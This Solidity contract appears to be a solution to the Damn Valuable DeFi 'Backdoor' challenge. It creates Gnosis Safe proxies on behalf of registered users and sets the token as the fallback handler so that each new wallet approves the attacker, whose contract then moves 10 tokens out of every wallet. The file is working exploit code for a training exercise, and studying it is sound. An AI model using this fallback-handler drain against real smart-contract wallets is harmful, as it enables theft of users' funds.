// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "../../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {
    DamnValuableToken private /*immutable*/ dvt;
    GnosisSafe private /*immutable*/ safe;
    GnosisSafeProxyFactory private /*immutable*/ proxyFactory;
    WalletRegistry private /*immutable*/ registry;
    address[] private users;
    
    // address private immutable owner;

    constructor(
        address _dvt,
        address _safe,
        address _proxyFactory,
        address _registry,
        address[] memory _users
    ) {
        dvt = DamnValuableToken(_dvt);
        safe = GnosisSafe(payable(_safe));
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        registry = WalletRegistry(_registry);
        users = _users;

        // owner = msg.sender;
        exploit();
    }

    function exploit() internal {
        // require(msg.sender == owner, "nope");

        for(uint256 i = 0; i < users.length; ++i) {
            address user = users[i];

            address[] memory owners = new address[](1);
            owners[0] = user;
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(0),
                '',
                address(dvt),
                address(dvt),
                0,
                0
            );

            address proxy = address(proxyFactory.createProxyWithCallback(
                address(safe),
                initializer,
                i,
                IProxyCreationCallback(address(registry))
            ));
            DamnValuableToken(proxy).approve(address(this), 10 ether);
            dvt.transferFrom(proxy, msg.sender, 10 ether);
        }
    }
}